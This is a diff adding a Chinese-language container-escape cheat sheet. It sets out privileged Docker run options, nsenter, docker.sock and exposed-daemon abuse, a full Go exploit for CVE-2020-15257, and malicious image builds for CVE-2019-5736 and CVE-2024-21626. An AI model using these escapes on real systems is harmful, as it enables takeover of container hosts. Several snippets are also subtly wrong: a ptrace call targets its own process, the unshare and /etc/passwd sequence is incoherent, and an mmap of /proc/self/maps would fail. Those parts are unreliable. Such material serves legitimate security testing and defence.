@@ -239,3 +239,368 @@ cat ${OUTPUT_PATH}
 ```
 
 ### Docker挂载
+
+Docker启动选项
+```Bash
+docker run --rm -it -v /:/host [镜像名] /bin/bash
+```
+
+容器内执行
+```Bash
+cd /host
+ls
+```
+
+### 宿主机PID
+
+Docker启动选项
+```Bash
+docker run --rm -it --pid=host [镜像名] /bin/bash
+```
+
+容器内执行
+```Bash
+ps auxn
+for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
+for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > file.txt
+cat /proc/进程ID/fd/文件描述符
+```
+
+如果以某种方式对容器外部的进程拥有特权访问，则可以运行以下命令运行具有与该进程相同 ns 限制的shell
+```Bash
+nsenter --target <pid> --all
+nsenter --target <pid> --mount --net --pid --cgroup
+```
+
+### 宿主机网络
+
+Docker启动选项
+```Bash
+docker run --rm -it --network=host [镜像名] /bin/bash
+```
+
+容器内执行
+```Bash
+apt-get update
+apt install tcpdump
+tcpdump -i 网络接口
+```
+
+### 宿主机IPC
+
+Docker启动选项
+```Bash
+docker run --rm -it --ipc=host [镜像名] /bin/bash
+```
+
+容器内执行
+```Bash
+ipcs -a
+```
+
+获取容器内存布局
+```c
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+int main() {
+    int fd = open("/proc/self/maps", O_RDONLY);
+    if (fd < 0) {
+        perror("open");
+        return 1;
+    }
+
+    char *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
+    if (map == MAP_FAILED) {
+        perror("mmap");
+        return 1;
+    }
+
+    printf("%s\n", map);
+    munmap(map, 4096);
+    close(fd);
+    return 0;
+}
+```
+
+ptrace附加主机进程
+```c
+#include <sys/ptrace.h>
+#include <unistd.h>
+
+int main() {
+    pid_t pid = getpid();
+    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
+    waitpid(pid, NULL, 0);
+
+    char *argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;
+}
+```
+
+### unshare
+
+容器内执行
+```Bash
+unshare -f /proc/self/fd
+mknod /proc/self/fd/1
+cat /proc/self/fd/1 > /etc/passwd
+chmod 777 /etc/passwd
+chroot /挂载目录 /bin/bash
+```
+
+### Docker守护进程配置错误
+
+利用守护进程创建容器
+```python
+import docker
+client = docker.DockerClient(base_url='tcp://宿主机IP:2375')
+client.containers.run('alpine:latest', 'touch /tmp/escape_success')
+```
+
+docker.sock挂载到容器内部
+```Bash
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock [镜像名] /bin/bash
+
+容器内执行
+docker -H unix:///var/run/docker.sock [命令]
+```
+
+### 容器运行时
+
+1.CVE-2020-15257
+
+containerd-shim API
+```Bash
+service Shim {
+	// State returns shim and task state information.
+	rpc State(StateRequest) returns (StateResponse);
+	rpc Create(CreateTaskRequest) returns (CreateTaskResponse);
+	rpc Start(StartRequest) returns (StartResponse);
+	rpc Delete(google.protobuf.Empty) returns (DeleteResponse);
+	rpc DeleteProcess(DeleteProcessRequest) returns (DeleteResponse);
+	rpc ListPids(ListPidsRequest) returns (ListPidsResponse);
+	rpc Pause(google.protobuf.Empty) returns (google.protobuf.Empty);
+	rpc Resume(google.protobuf.Empty) returns (google.protobuf.Empty);
+	rpc Checkpoint(CheckpointTaskRequest) returns (google.protobuf.Empty);
+	rpc Kill(KillRequest) returns (google.protobuf.Empty);
+	rpc Exec(ExecProcessRequest) returns (google.protobuf.Empty);
+	rpc ResizePty(ResizePtyRequest) returns (google.protobuf.Empty);
+	rpc CloseIO(CloseIORequest) returns (google.protobuf.Empty);
+	// ShimInfo returns information about the shim.
+	rpc ShimInfo(google.protobuf.Empty) returns (ShimInfoResponse);
+	rpc Update(UpdateTaskRequest) returns (google.protobuf.Empty);
+	rpc Wait(WaitRequest) returns (WaitResponse);
+}
+```
+
+exp:
+
+[summershrimp](https://github.com/summershrimp/exploits-open/tree/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257)
+
+```go
+package main
+
+import (
+    "context"
+    "errors"
+    "io/ioutil"
+    "log"
+    "net"
+    "regexp"
+    "strings"
+
+    "github.com/containerd/ttrpc"
+    shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
+)
+
+func getDockerID() (string,  error) {
+    re, err := regexp.Compile("pids:/docker/.*")
+    if err != nil {
+        return "", err
+    }
+    data, err := ioutil.ReadFile("/proc/self/cgroup")
+    matches := re.FindAll(data, -1)
+    if matches == nil {
+        return "", errors.New("Cannot find docker id")
+    }
+
+    tmp_docker_id := matches[0]
+    docker_id := string(tmp_docker_id[13 : len(tmp_docker_id)])
+    return docker_id, nil
+
+}
+
+func getMergedPath() (string,  error) {
+    re, err := regexp.Compile("workdir=.*")
+    if err != nil {
+        return "", err
+    }
+    data, err := ioutil.ReadFile("/etc/mtab")
+    matches := re.FindAll(data, -1)
+    if matches == nil {
+        return "", errors.New("Cannot find merged path")
+    }
+
+    tmp_path := matches[0]
+    path := string(tmp_path[8 : len(tmp_path)-8])
+    merged := path + "merged/"
+    return merged, nil
+
+}
+
+func getShimSockets() ([][]byte, error) {
+    re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
+    if err != nil {
+        return nil, err
+    }
+    data, err := ioutil.ReadFile("/proc/net/unix")
+    matches := re.FindAll(data, -1)
+    if matches == nil {
+        return nil, errors.New("Cannot find vulnerable socket")
+    }
+
+    return matches, nil
+}
+
+
+func exp(sock string, docker_id string, payload_path string) bool {
+    sock = strings.Replace(sock, "@", "", -1)
+    conn, err := net.Dial("unix", "\x00"+sock)
+    if err != nil {
+        log.Println(err)
+        return false
+    }
+
+    client := ttrpc.NewClient(conn)
+    shimClient := shimapi.NewShimClient(client)
+
+    ctx := context.Background()
+    md := ttrpc.MD{}
+    md.Set("containerd-namespace-ttrpc", "notmoby")
+    ctx = ttrpc.WithMetadata(ctx, md)
+
+    /* // poc get shim pid
+    info, err := shimClient.ShimInfo(ctx, &types.Empty{})
+    if err != nil {
+        log.Println("rpc error:", err)
+        return false
+    }
+
+    log.Println("shim pid:", info.ShimPid)
+    */
+
+    r, err := shimClient.Create(ctx, &shimapi.CreateTaskRequest{
+        ID: docker_id,
+        Bundle: "/run/containerd/io.containerd.runtime.v1.linux/moby/"+docker_id+"/config.json",
+        Runtime : "io.containerd.runtime.v1.linux",
+        Stdin:  "anything",
+        //Stdout: "binary:///bin/sh?-c=cat%20/proc/self/status%20>/tmp/foobar",
+        Stdout: "binary:///bin/sh?-c="+payload_path+"nc",
+        Stderr: "anything",
+        Terminal : false,
+        Checkpoint : "anything",
+    })
+
+    if err != nil {
+            log.Println(err)
+            return false
+    }
+
+    log.Println(r)
+    return true
+}
+
+func main() {
+    matchset := make(map[string]bool)
+    socks, err := getShimSockets()
+
+    docker_id, err := getDockerID()
+    log.Println("find docker id:", docker_id)
+
+    merged_path, err := getMergedPath()
+    log.Println("find path:", merged_path)
+
+    if err != nil {
+        log.Fatalln(err)
+    }
+
+    for _, b := range socks {
+        sockname := string(b)
+        if _, ok := matchset[sockname]; ok {
+            continue
+        }
+        log.Println("try socket:", sockname)
+        matchset[sockname] = true
+        if exp(sockname, docker_id, merged_path) {
+            break
+        }
+    }
+
+    return
+}
+```
+
+2.CVE-2019-5736
+
+exp:
+
+[UNIT42](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
+
+[twistlock](https://github.com/twistlock/RunC-CVE-2019-5736/tree/master/exec_POC)
+
+[Frichetten](https://github.com/Frichetten/CVE-2019-5736-PoC)
+
+恶意Docker镜像
+```Bash
+FROM ubuntu:18.04
+
+# 获取libseccomp源代码和所需依赖
+RUN set -e -x ;\
+    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
+    apt -y update ;\
+    apt-get -y install build-essential ;\
+    cd /root ;\
+    apt-get -y build-dep libseccomp ;\
+    apt-get source libseccomp
+
+# 将run_at_link函数附加到libseccomp-2.3.1/src/api.c文件并构建
+ADD run_at_link.c /root/run_at_link.c
+RUN set -e -x ;\
+    cd /root/libseccomp-* ;\
+    cat /root/run_at_link.c >> src/api.c ;\
+    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
+    dpkg -i /root/*.deb
+
+# 添加overwrite_runc.c文件并编译
+ADD overwrite_runc.c /root/overwrite_runc.c
+RUN set -e -x ;\
+    cd /root ;\
+    gcc overwrite_runc.c -o /overwrite_runc
+
+# 添加new_runc文件以在执行替换
+ADD new_runc /root/new_runc
+
+# 创建符号链接并设置为入口点
+RUN set -e -x ;\
+    ln -s /proc/self/exe /entrypoint
+ENTRYPOINT [ "/entrypoint" ]
+```
+
+3.CVE-2024-21626
+
+构建恶意镜像
+```Bash
+FROM ubuntu:22.04
+RUN ls -al ./
+WORKDIR /proc/self/fd/8
+```
+
+Other
+
+CVE-2022-0492
+
+## Docker提权
